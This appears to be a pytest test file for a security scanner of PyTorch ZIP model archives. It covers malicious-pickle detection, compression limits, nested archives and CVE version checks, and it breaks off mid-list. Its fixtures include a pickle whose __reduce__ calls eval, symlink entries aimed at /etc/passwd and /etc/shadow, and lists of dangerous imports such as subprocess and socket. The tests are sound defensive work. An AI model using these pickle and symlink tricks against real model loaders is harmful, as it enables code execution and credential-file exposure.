    """Test edge cases for numeric file detection in archive/data/."""
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")

        # Add a normal pickle file
        data = {"weights": [1, 2, 3]}
        pickled_data = pickle.dumps(data)
        zipf.writestr("archive/data.pkl", pickled_data)

        # Edge cases that should NOT be skipped:
        # - File with number in extension
        zipf.writestr("archive/data/weights.v2", b"data")
        # - File starting with number but not pure numeric
        zipf.writestr("archive/data/0abc", b"data")
        # - File with hex notation
        zipf.writestr("archive/data/0x123", b"data")

        # Files that SHOULD be skipped (pure numeric):
        zipf.writestr("archive/data/0", b"\x00" * 1000)
        zipf.writestr("archive/data/42", b"\x00" * 1000)
        zipf.writestr("archive/data/999999", b"\x00" * 1000)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    # Should complete successfully without hanging
    assert result.success is True


def test_pytorch_zip_scanner_can_handle_pkl_extension(tmp_path):
    """Test that PyTorchZipScanner can_handle returns True for ZIP-format .pkl files.

    PyTorch's torch.save() uses ZIP format by default since v1.6 (_use_new_zipfile_serialization=True).
    This test verifies that .pkl files with ZIP headers are correctly identified.
    """
    # Create a ZIP-format .pkl file (simulating torch.save() default behavior)
    pkl_path = tmp_path / "model.pkl"
    with zipfile.ZipFile(pkl_path, "w") as zipf:
        zipf.writestr("version", "3")
        data = {"weights": [1, 2, 3]}
        pickled_data = pickle.dumps(data)
        zipf.writestr("data.pkl", pickled_data)

    assert PyTorchZipScanner.can_handle(str(pkl_path)) is True


def test_pytorch_zip_scanner_cannot_handle_raw_pkl(tmp_path):
    """Test that PyTorchZipScanner can_handle returns False for raw pickle .pkl files.

    Raw pickle files (created with _use_new_zipfile_serialization=False) should not be
    handled by PyTorchZipScanner - they should go to the PickleScanner instead.
    """
    # Create a raw pickle .pkl file (non-ZIP format)
    pkl_path = tmp_path / "model.pkl"
    data = {"weights": [1, 2, 3]}
    with open(pkl_path, "wb") as f:
        pickle.dump(data, f)

    assert PyTorchZipScanner.can_handle(str(pkl_path)) is False


def test_pytorch_zip_scanner_scans_zip_pkl_successfully(tmp_path):
    """Test that PyTorchZipScanner successfully scans ZIP-format .pkl files.

    This is the fix for the issue where torch.save() creates ZIP files with .pkl extension
    by default, but ModelAudit was routing them to PickleScanner which failed with
    UnicodeDecodeError.
    """
    # Create a ZIP-format .pkl file (simulating torch.save() default behavior)
    pkl_path = tmp_path / "model.pkl"
    with zipfile.ZipFile(pkl_path, "w") as zipf:
        # Standard PyTorch ZIP structure
        zipf.writestr("version", "3")
        zipf.writestr("byteorder", "little")
        zipf.writestr(".format_version", "1")

        # Create a proper pickle with torch-like structure
        data = {"linear.weight": [1.0, 2.0], "linear.bias": [0.1]}
        pickled_data = pickle.dumps(data)
        zipf.writestr("model/data.pkl", pickled_data)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(pkl_path))

    # Should succeed without errors
    assert result.success is True
    assert result.bytes_scanned > 0

    # No critical issues
    critical_issues = [issue for issue in result.issues if issue.severity == IssueSeverity.CRITICAL]
    assert len(critical_issues) == 0


def test_pytorch_zip_scanner_detects_malicious_zip_pkl(tmp_path):
    """Test that PyTorchZipScanner detects malicious content in ZIP-format .pkl files."""
    # Create a ZIP-format .pkl file with malicious pickle content
    pkl_path = tmp_path / "model.pkl"
    with zipfile.ZipFile(pkl_path, "w") as zipf:
        zipf.writestr("version", "3")

        # Create a malicious pickle that would execute code
        class MaliciousClass:
            def __reduce__(self):
                return (eval, ("print('pwned')",))

        data = {"malicious": MaliciousClass()}
        pickled_data = pickle.dumps(data)
        zipf.writestr("data.pkl", pickled_data)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(pkl_path))

    # Should detect the eval function
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any("eval" in issue.message.lower() for issue in result.issues)


def test_pytorch_zip_scanner_preserves_legacy_pickle_rule_codes_for_embedded_members(tmp_path: Path) -> None:
    fixture_path = _ASSETS_DIR / "samples" / "pickles" / "decode_exec_chain.pkl"
    model_path = tmp_path / "decode_exec_chain.pt"
    with zipfile.ZipFile(model_path, "w") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", fixture_path.read_bytes())

    result = PyTorchZipScanner().scan(str(model_path))

    assert any(
        issue.rule_code == "S604" and "S104" in issue.details.get("legacy_rule_aliases", []) for issue in result.issues
    )


def test_pytorch_zip_scanner_trusts_storage_persistent_ids_in_data_pkl(tmp_path: Path) -> None:
    payload = _pytorch_storage_persistent_id_payload("0")
    model_path = create_mock_pytorch_zip(tmp_path / "storage_persistent_id.pt", with_pickle=False, prefix="archive")
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("archive/data.pkl", payload)
        zipf.writestr("archive/data/0", b"\x00" * 8)

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is True
    assert not any(issue.details.get("pickle_rule_code") == "PERSISTENT_ID" for issue in result.issues)
    trusted_checks = [check for check in result.checks if check.details.get("trusted_pytorch_archive_context") is True]
    assert trusted_checks
    assert all(check.status == CheckStatus.PASSED for check in trusted_checks)
    assert all(check.severity == IssueSeverity.INFO for check in trusted_checks)


def test_pytorch_zip_scanner_trusts_storage_persistent_ids_with_utf8_byte_key(tmp_path: Path) -> None:
    payload = _pytorch_storage_persistent_id_payload(b"0")
    model_path = create_mock_pytorch_zip(tmp_path / "storage_persistent_id_bytes.pt", with_pickle=False)
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", payload)
        zipf.writestr("data/0", b"\x00" * 8)

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is True
    assert not any(issue.details.get("pickle_rule_code") == "PERSISTENT_ID" for issue in result.issues)
    assert any(check.details.get("trusted_pytorch_archive_context") is True for check in result.checks)


def test_pytorch_zip_scanner_does_not_trust_storage_persistent_ids_with_non_utf8_byte_key(
    tmp_path: Path,
) -> None:
    payload = _pytorch_storage_persistent_id_payload(b"\xff")
    model_path = create_mock_pytorch_zip(tmp_path / "storage_persistent_id_non_utf8_bytes.pt", with_pickle=False)
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", payload)
        zipf.writestr("data/0", b"\x00" * 8)

    result = PyTorchZipScanner().scan(str(model_path))

    assert any(issue.details.get("pickle_rule_code") == "PERSISTENT_ID" for issue in result.issues)
    assert not any(check.details.get("trusted_pytorch_archive_context") is True for check in result.checks)


def test_pytorch_zip_scanner_does_not_trust_storage_persistent_ids_without_storage_layout(
    tmp_path: Path,
) -> None:
    payload = _pytorch_storage_persistent_id_payload("0")
    model_path = create_mock_pytorch_zip(tmp_path / "storage_persistent_id_untrusted.pt", with_pickle=False)
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("data.pkl", payload)

    result = PyTorchZipScanner().scan(str(model_path))

    assert any(issue.details.get("pickle_rule_code") == "PERSISTENT_ID" for issue in result.issues)
    assert not any(check.details.get("trusted_pytorch_archive_context") is True for check in result.checks)


def test_pytorch_zip_scanner_does_not_trust_storage_persistent_ids_with_only_data_directory(
    tmp_path: Path,
) -> None:
    payload = _pytorch_storage_persistent_id_payload("0")
    model_path = create_mock_pytorch_zip(tmp_path / "storage_persistent_id_directory.pt", with_pickle=False)
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", payload)
        zipf.writestr("data/", b"")

    result = PyTorchZipScanner().scan(str(model_path))

    assert any(issue.details.get("pickle_rule_code") == "PERSISTENT_ID" for issue in result.issues)
    assert not any(check.details.get("trusted_pytorch_archive_context") is True for check in result.checks)


def test_pytorch_zip_scanner_does_not_trust_storage_persistent_ids_with_non_ascii_digit_blob(
    tmp_path: Path,
) -> None:
    payload = _pytorch_storage_persistent_id_payload("0")
    model_path = create_mock_pytorch_zip(tmp_path / "storage_persistent_id_non_ascii_digit.pt", with_pickle=False)
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", payload)
        zipf.writestr("data/\uff10", b"\x00" * 8)

    result = PyTorchZipScanner().scan(str(model_path))

    assert any(issue.details.get("pickle_rule_code") == "PERSISTENT_ID" for issue in result.issues)
    assert not any(check.details.get("trusted_pytorch_archive_context") is True for check in result.checks)


def test_pytorch_zip_scanner_does_not_trust_storage_persistent_ids_with_unrelated_blob(
    tmp_path: Path,
) -> None:
    payload = _pytorch_storage_persistent_id_payload("1")
    model_path = create_mock_pytorch_zip(tmp_path / "storage_persistent_id_unrelated_blob.pt", with_pickle=False)
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", payload)
        zipf.writestr("data/0", b"\x00" * 8)

    result = PyTorchZipScanner().scan(str(model_path))

    assert any(issue.details.get("pickle_rule_code") == "PERSISTENT_ID" for issue in result.issues)
    assert not any(check.details.get("trusted_pytorch_archive_context") is True for check in result.checks)


def test_pytorch_zip_scanner_scopes_storage_persistent_id_trust_by_prefix(tmp_path: Path) -> None:
    payload = _pytorch_storage_persistent_id_payload("0")
    model_path = tmp_path / "mixed_storage_persistent_id.pt"
    with zipfile.ZipFile(model_path, "w") as zipf:
        zipf.writestr("good/version", "3")
        zipf.writestr("good/data.pkl", payload)
        zipf.writestr("good/data/0", b"\x00" * 8)
        zipf.writestr("evil/data.pkl", payload)

    result = PyTorchZipScanner().scan(str(model_path))

    persistent_id_issues = [
        issue for issue in result.issues if issue.details.get("pickle_rule_code") == "PERSISTENT_ID"
    ]
    assert any(issue.details.get("pickle_filename") == "evil/data.pkl" for issue in persistent_id_issues)
    assert not any(issue.details.get("pickle_filename") == "good/data.pkl" for issue in persistent_id_issues)

    trusted_checks = [check for check in result.checks if check.details.get("trusted_pytorch_archive_context") is True]
    assert any(check.details.get("pickle_filename") == "good/data.pkl" for check in trusted_checks)


def test_pytorch_zip_scanner_entry_limit(tmp_path):
    """Test that scanner enforces archive entry count limits."""
    zip_path = tmp_path / "model.pt"

    # Create archive with many entries (exceeding default limit)
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        # Create entries exceeding the limit
        for i in range(15):
            zipf.writestr(f"entry_{i}.txt", "data")

    # Use a low limit for testing
    scanner = PyTorchZipScanner(config={"max_archive_entries": 10})
    result = scanner.scan(str(zip_path))

    # Should have warning about entry count
    entry_issues = [
        i
        for i in result.issues
        if "entries" in i.message.lower() and ("max" in i.message.lower() or "limit" in i.message.lower())
    ]
    assert len(entry_issues) > 0
    assert entry_issues[0].severity == IssueSeverity.WARNING


def test_pytorch_zip_scanner_entry_limit_passes(tmp_path):
    """Test that scanner passes when entry count is within limits."""
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        data = pickle.dumps({"weights": [1, 2, 3]})
        zipf.writestr("data.pkl", data)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    # Should pass entry limit check - look for passed checks about entry count
    entry_checks = [c for c in result.checks if "entry" in c.name.lower()]
    assert len(entry_checks) > 0
    assert all(c.status == CheckStatus.PASSED for c in entry_checks)


def test_pytorch_zip_scanner_compression_ratio_check(tmp_path):
    """Test that scanner detects suspicious compression ratios."""

    zip_path = tmp_path / "model.pt"

    # Create a file with extremely high compression ratio (repetitive data compresses well)
    with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zipf:
        zipf.writestr("version", "3")
        # Create highly compressible data (1MB of zeros will compress to almost nothing)
        highly_compressible = b"\x00" * (1024 * 1024)
        zipf.writestr("suspicious_data.bin", highly_compressible)

    # Use a low threshold for testing
    scanner = PyTorchZipScanner(config={"max_compression_ratio": 50})
    result = scanner.scan(str(zip_path))

    # Should have warning about compression ratio
    ratio_issues = [i for i in result.issues if "compression" in i.message.lower() and "ratio" in i.message.lower()]
    assert len(ratio_issues) > 0
    assert ratio_issues[0].severity == IssueSeverity.WARNING


def test_pytorch_zip_scanner_high_ratio_pickle_marks_scan_inconclusive(tmp_path: Path) -> None:
    """Skipped high-ratio pickle members must fail closed instead of disappearing from coverage."""
    zip_path = tmp_path / "ratio_elided_pickle.pt"
    payload = pickle.dumps(
        {
            "padding": b"\x00" * (1024 * 1024),
            "payload": _malicious_eval_pickle_payload(),
        },
        protocol=4,
    )

    with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", payload)

    result = PyTorchZipScanner(config={"max_compression_ratio": 10}).scan(str(zip_path))

    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_compression_ratio_unscanned" in result.metadata["scan_outcome_reasons"]
    ratio_checks = [
        check
        for check in result.checks
        if check.name == "Compression Ratio Check" and check.status == CheckStatus.FAILED
    ]
    assert len(ratio_checks) == 1
    assert ratio_checks[0].details["analysis_incomplete"] is True


def test_pytorch_zip_scanner_recurses_into_nested_zip_members(tmp_path: Path) -> None:
    """Nested ZIP payloads should be recursively routed instead of staying invisible."""
    nested_zip = tmp_path / "nested.zip"
    with zipfile.ZipFile(nested_zip, "w") as archive:
        archive.writestr("payload.pkl", _malicious_eval_pickle_payload())

    zip_path = tmp_path / "nested_payload.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zipf.write(nested_zip, "archive/nested.zip")

    result = PyTorchZipScanner().scan(str(zip_path))

    assert result.metadata["file_size"] == zip_path.stat().st_size
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.location is not None
        and f"{zip_path}:archive/nested.zip:payload.pkl" in issue.location
        for issue in result.issues
    )


def test_pytorch_zip_scanner_recurses_into_zip_members_named_like_pickles(tmp_path: Path) -> None:
    nested_zip = tmp_path / "nested.zip"
    with zipfile.ZipFile(nested_zip, "w") as archive:
        archive.writestr("payload.pkl", _malicious_eval_pickle_payload())

    zip_path = tmp_path / "nested_payload.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zipf.write(nested_zip, "archive/nested.pkl")

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.location is not None
        and f"{zip_path}:archive/nested.pkl:payload.pkl" in issue.location
        for issue in result.issues
    )


def test_pytorch_zip_scanner_bounds_nested_zip_member_copy(tmp_path: Path) -> None:
    """Oversized nested ZIP members should fail closed before rescanning."""
    nested_zip = tmp_path / "nested.zip"
    with zipfile.ZipFile(nested_zip, "w") as archive:
        archive.writestr("payload.pkl", _malicious_eval_pickle_payload())

    zip_path = tmp_path / "nested_payload.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zipf.write(nested_zip, "archive/nested.zip")

    nested_scan_calls: list[str] = []

    def scan_nested_member(path: str, config: dict[str, object] | None = None) -> ScanResult:
        nested_scan_calls.append(path)
        nested_result = ScanResult(scanner_name="zip")
        nested_result.finish(success=True)
        return nested_result

    result = PyTorchZipScanner(
        config={
            "max_nested_zip_member_bytes": nested_zip.stat().st_size - 1,
            NESTED_SCAN_CALLBACK_CONFIG_KEY: scan_nested_member,
        }
    ).scan(str(zip_path))

    assert result.success is False
    assert nested_scan_calls == []
    size_checks = [check for check in result.checks if check.name == "Nested ZIP Size Limit"]
    assert len(size_checks) == 1
    assert size_checks[0].details["zip_entries"] == ["archive/nested.zip"]
    assert size_checks[0].details["max_member_bytes"] == nested_zip.stat().st_size - 1
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_nested_archive_size_limit" in result.metadata["scan_outcome_reasons"]


def test_pytorch_zip_scanner_enforces_nested_zip_depth_limit(tmp_path: Path) -> None:
    """Nested ZIP recursion should stop once the shared archive depth cap is reached."""
    nested_zip = tmp_path / "nested.zip"
    with zipfile.ZipFile(nested_zip, "w") as archive:
        archive.writestr("payload.pkl", _malicious_eval_pickle_payload())

    zip_path = tmp_path / "nested_payload.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zipf.write(nested_zip, "archive/nested.zip")

    nested_scan_calls: list[str] = []

    def scan_nested_member(path: str, config: dict[str, object] | None = None) -> ScanResult:
        nested_scan_calls.append(path)
        nested_result = ScanResult(scanner_name="zip")
        nested_result.finish(success=True)
        return nested_result

    result = PyTorchZipScanner(
        config={
            "max_zip_depth": 1,
            "_archive_depth": 1,
            NESTED_SCAN_CALLBACK_CONFIG_KEY: scan_nested_member,
        }
    ).scan(str(zip_path))

    assert result.success is False
    assert nested_scan_calls == []
    depth_checks = [check for check in result.checks if check.name == "Nested ZIP Depth Limit"]
    assert len(depth_checks) == 1
    assert depth_checks[0].details["zip_entries"] == ["archive/nested.zip"]
    assert depth_checks[0].details["max_depth"] == 1
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_nested_archive_depth_limit" in result.metadata["scan_outcome_reasons"]


def test_pytorch_zip_scanner_small_high_ratio_metadata_stays_clean(tmp_path: Path) -> None:
    """Small repetitive metadata should not fail the compression ratio check."""
    zip_path = create_mock_pytorch_zip(tmp_path / "model.pt")
    with zipfile.ZipFile(zip_path, "a", compression=zipfile.ZIP_DEFLATED) as zipf:
        zipf.writestr("metadata/repetitive.txt", "A" * 16384)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    ratio_failures = [
        check
        for check in result.checks
        if check.name == "Compression Ratio Check" and check.status == CheckStatus.FAILED
    ]
    assert ratio_failures == []
    assert not [
        issue
        for issue in result.issues
        if "compression ratio" in issue.message.lower()
        and issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    ratio_successes = [
        check
        for check in result.checks
        if check.name == "Compression Ratio Check" and check.status == CheckStatus.PASSED
    ]
    assert len(ratio_successes) == 1
    assert ratio_successes[0].details["min_uncompressed_size"] == 1024 * 1024


def test_pytorch_zip_scanner_compression_ratio_passes(tmp_path):
    """Test that scanner passes when compression ratio is within limits."""
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        # Random-ish data doesn't compress well
        data = pickle.dumps({"weights": list(range(1000))})
        zipf.writestr("data.pkl", data)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    # Should pass compression check - look for passed checks about compression
    ratio_checks = [c for c in result.checks if "compression" in c.name.lower()]
    assert len(ratio_checks) > 0
    assert all(c.status == CheckStatus.PASSED for c in ratio_checks)


def test_pytorch_zip_scanner_symlink_detection(tmp_path):
    """Test that scanner detects symlinks in archives."""

    zip_path = tmp_path / "model.pt"

    # Create a ZIP file with a symlink entry
    # Symlinks in ZIP files have external_attr with S_IFLNK flag
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")

        # Create a symlink entry manually
        # The external_attr field encodes the Unix file mode
        # S_IFLNK = 0o120000 (symlink)
        symlink_info = zipfile.ZipInfo("malicious_link")
        # Set external attributes to indicate symlink (Unix mode in upper 16 bits)
        symlink_info.external_attr = 0o120777 << 16  # symlink with full permissions
        symlink_info.compress_type = zipfile.ZIP_STORED
        zipf.writestr(symlink_info, "/etc/passwd")

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    # Should have warning about symlink
    symlink_issues = [i for i in result.issues if "symlink" in i.message.lower()]
    assert len(symlink_issues) > 0
    assert symlink_issues[0].severity == IssueSeverity.WARNING


def test_pytorch_zip_scanner_no_symlinks_passes(tmp_path):
    """Test that scanner passes when no symlinks are present."""
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        data = pickle.dumps({"weights": [1, 2, 3]})
        zipf.writestr("data.pkl", data)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    # Should pass symlink check - look for passed checks about symlinks
    symlink_checks = [c for c in result.checks if "symlink" in c.name.lower()]
    assert len(symlink_checks) > 0
    assert all(c.status == CheckStatus.PASSED for c in symlink_checks)


def test_pytorch_zip_scanner_combined_security_controls(tmp_path):
    """Test that multiple security controls fire together without interfering."""
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        # Generate enough entries to exceed a low limit
        for i in range(12):
            zipf.writestr(f"entry_{i}.txt", "data")
        # Add a symlink entry
        symlink_info = zipfile.ZipInfo("evil_link")
        symlink_info.external_attr = 0o120777 << 16
        symlink_info.compress_type = zipfile.ZIP_STORED
        zipf.writestr(symlink_info, "/etc/shadow")

    scanner = PyTorchZipScanner(config={"max_archive_entries": 10})
    result = scanner.scan(str(zip_path))

    # Entry limit should trigger
    entry_issues = [
        i
        for i in result.issues
        if "entries" in i.message.lower() and ("max" in i.message.lower() or "limit" in i.message.lower())
    ]
    assert len(entry_issues) > 0
    assert entry_issues[0].severity == IssueSeverity.WARNING

    # Symlink should also trigger independently
    symlink_issues = [i for i in result.issues if "symlink" in i.message.lower()]
    assert len(symlink_issues) > 0
    assert symlink_issues[0].severity == IssueSeverity.WARNING


def test_pytorch_zip_version_extraction_returns_metadata_when_present(monkeypatch: pytest.MonkeyPatch) -> None:
    """The raw extractor should preserve metadata when both sources are present."""
    scanner = PyTorchZipScanner()
    monkeypatch.setattr(scanner, "_get_installed_pytorch_version", lambda: "2.5.1")

    detected_version, source = scanner._get_detected_pytorch_version(
        {"pytorch_framework_version": "2.10.0", "pytorch_version_source": "metadata:config.json:pytorch_version"}
    )

    assert detected_version == "2.10.0"
    assert source == "metadata:config.json:pytorch_version"


def test_pytorch_zip_version_selection_prefers_local_vulnerable_version(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A vulnerable local runtime must override fixed artifact metadata."""
    scanner = PyTorchZipScanner()

    monkeypatch.setattr(scanner, "_get_installed_pytorch_version", lambda: "2.5.1")

    detected_version, source = scanner._select_pytorch_version_for_check(
        {"pytorch_framework_version": "2.10.0", "pytorch_version_source": "metadata:config.json:pytorch_version"},
        scanner._is_vulnerable_pytorch_version,
    )

    assert detected_version == "2.5.1"
    assert source == "local_environment"


def test_pytorch_zip_version_selection_prefers_metadata_when_local_is_fixed(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A fixed local runtime must not hide vulnerable artifact metadata."""
    scanner = PyTorchZipScanner()

    monkeypatch.setattr(scanner, "_get_installed_pytorch_version", lambda: "2.10.0")

    detected_version, source = scanner._select_pytorch_version_for_check(
        {"pytorch_framework_version": "2.9.0", "pytorch_version_source": "metadata:config.json:pytorch_version"},
        scanner._is_vulnerable_pytorch_version_2026,
    )

    assert detected_version == "2.9.0"
    assert source == "metadata:config.json:pytorch_version"


def test_pytorch_zip_version_selection_uses_metadata_when_torch_unavailable(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Metadata fallback should still work when local torch isn't importable."""
    scanner = PyTorchZipScanner()
    monkeypatch.setattr(scanner, "_get_installed_pytorch_version", lambda: None)

    detected_version, source = scanner._select_pytorch_version_for_check(
        {"pytorch_framework_version": "2.5.1", "pytorch_version_source": "metadata:config.json:pytorch_version"},
        scanner._is_vulnerable_pytorch_version,
    )

    assert detected_version == "2.5.1"
    assert source == "metadata:config.json:pytorch_version"


def test_get_installed_pytorch_version_does_not_import_torch(monkeypatch: pytest.MonkeyPatch) -> None:
    """Scanner should not import torch while collecting version context."""
    import builtins
    import sys

    scanner = PyTorchZipScanner()
    real_import = builtins.__import__
    import_calls: list[str] = []

    def fail_torch_import(
        name: str,
        globals: dict[str, object] | None = None,
        locals: dict[str, object] | None = None,
        fromlist: tuple[str, ...] = (),
        level: int = 0,
    ) -> object:
        import_calls.append(name)
        if name == "torch":
            raise RuntimeError("broken torch import")
        return real_import(name, globals, locals, fromlist, level)

    monkeypatch.delitem(sys.modules, "torch", raising=False)
    monkeypatch.setattr(builtins, "__import__", fail_torch_import)

    assert scanner._get_installed_pytorch_version() is None
    assert "torch" not in import_calls


def test_pytorch_zip_version_detection_uses_local_torch_when_metadata_missing(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Local torch version should be used only as a fallback when metadata is absent."""
    scanner = PyTorchZipScanner()
    monkeypatch.setattr(scanner, "_get_installed_pytorch_version", lambda: "2.5.1")

    detected_version, source = scanner._get_detected_pytorch_version({})

    assert detected_version == "2.5.1"
    assert source == "local_environment"


# CVE-2026-24747 Tests


def _create_pytorch_zip_with_framework_version(path: Path, pytorch_version: str) -> Path:
    with zipfile.ZipFile(path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1.0, 2.0, 3.0]}))
        zipf.writestr("config.json", json.dumps({"pytorch_version": pytorch_version}))
    return path


def test_pytorch_zip_cve_2026_24747_version_check(tmp_path: Path) -> None:
    """Model metadata with vulnerable version should trigger CVE-2026-24747."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "2.9.0")
    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))
    cve_2026_checks = [c for c in result.checks if "CVE-2026-24747" in c.name]
    failed_checks = [c for c in cve_2026_checks if c.status == CheckStatus.FAILED]
    assert len(failed_checks) > 0, (
        f"Should flag PyTorch 2.9.0 as vulnerable to CVE-2026-24747. "
        f"Checks: {[(c.name, c.status) for c in result.checks]}"
    )
    assert failed_checks[0].details.get("detected_pytorch_version") == "2.9.0"
    assert failed_checks[0].details.get("pytorch_version_source") == "metadata:config.json:pytorch_version"


def test_pytorch_zip_cve_2025_32434_metadata_not_suppressed_by_local_torch(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A fixed local torch install must not hide vulnerable artifact metadata."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "2.5.1")
    scanner = PyTorchZipScanner()
    monkeypatch.setattr(scanner, "_get_installed_pytorch_version", lambda: "2.6.0")

    result = scanner.scan(str(model_path))

    failed_checks = [
        c for c in result.checks if c.name == "CVE-2025-32434 PyTorch Version Check" and c.status == CheckStatus.FAILED
    ]
    assert len(failed_checks) > 0
    assert failed_checks[0].details.get("detected_pytorch_version") == "2.5.1"
    assert failed_checks[0].details.get("pytorch_version_source") == "metadata:config.json:pytorch_version"


def _pickle_result_with_reduce(import_reference: str | None = None) -> ScanResult:
    result = ScanResult(scanner_name="pickle")
    details: dict[str, object] = {"opcode": "REDUCE"}
    if import_reference is not None:
        details["import_reference"] = import_reference
    result.add_check(
        name="Dangerous Pickle Opcode",
        passed=False,
        message="REDUCE opcode detected",
        severity=IssueSeverity.WARNING,
        details=details,
    )
    return result


def _weights_only_analysis_check(result: ScanResult) -> Check:
    return next(check for check in result.checks if check.name == "CVE-2025-32434 Pickle Format Security Analysis")


def test_pytorch_zip_cve_2025_32434_empty_imports_stay_suspicious(tmp_path: Path) -> None:
    """Dangerous opcodes without import evidence must not be downgraded to INFO."""
    scanner = PyTorchZipScanner()
    pickle_result = _pickle_result_with_reduce()
    pytorch_result = ScanResult(scanner_name="pytorch_zip")

    scanner._add_weights_only_safety_warnings(pickle_result, pytorch_result, str(tmp_path / "model.pt"), "data.pkl")

    check = _weights_only_analysis_check(pytorch_result)
    assert check.severity == IssueSeverity.WARNING
    assert check.details["import_analysis"]["all_legitimate"] is False
    assert check.details["import_analysis"]["total_imports"] == 0


@pytest.mark.parametrize(
    "import_reference",
    [
        "torch._utils.evil",
        "collections.OrderedDictEvil",
        "torch._rebuild_tensor_v2.evil",
        "subprocesssafe.Popen",
        "webbrowsersafe.open",
        "socketed.connect",
    ],
)
def test_pytorch_zip_cve_2025_32434_safe_prefix_spoofing_stays_suspicious(
    tmp_path: Path, import_reference: str
) -> None:
    """Safe-looking prefixes must not count as legitimate imports by substring."""
    scanner = PyTorchZipScanner()
    pickle_result = _pickle_result_with_reduce(import_reference)
    pytorch_result = ScanResult(scanner_name="pytorch_zip")

    scanner._add_weights_only_safety_warnings(pickle_result, pytorch_result, str(tmp_path / "model.pt"), "data.pkl")

    check = _weights_only_analysis_check(pytorch_result)
    assert check.severity == IssueSeverity.WARNING
    assert check.details["import_analysis"]["all_legitimate"] is False
    assert import_reference in check.details["import_analysis"]["found_imports"]


@pytest.mark.parametrize(
    "import_reference",
    [
        "torch._utils._rebuild_tensor_v2",
        "torch._rebuild_tensor",
        "torch._rebuild_tensor_v2",
    ],
)
def test_pytorch_zip_cve_2025_32434_known_rebuild_reference_stays_info(tmp_path: Path, import_reference: str) -> None:
    """Known PyTorch rebuild functions remain informational to avoid noisy state-dict results."""
    scanner = PyTorchZipScanner()
    pickle_result = _pickle_result_with_reduce(import_reference)
    pytorch_result = ScanResult(scanner_name="pytorch_zip")

    scanner._add_weights_only_safety_warnings(pickle_result, pytorch_result, str(tmp_path / "model.pt"), "data.pkl")

    check = _weights_only_analysis_check(pytorch_result)
    assert check.severity == IssueSeverity.INFO
    assert check.details["import_analysis"]["all_legitimate"] is True


@pytest.mark.parametrize(
    "import_reference",
    [
        "__builtins__.eval",
        "asyncio.subprocess",
        "asyncio.subprocess.create_subprocess_shell",
        "builtins.compile",
        "builtins.__import__",
        "socket",
        "subprocess",
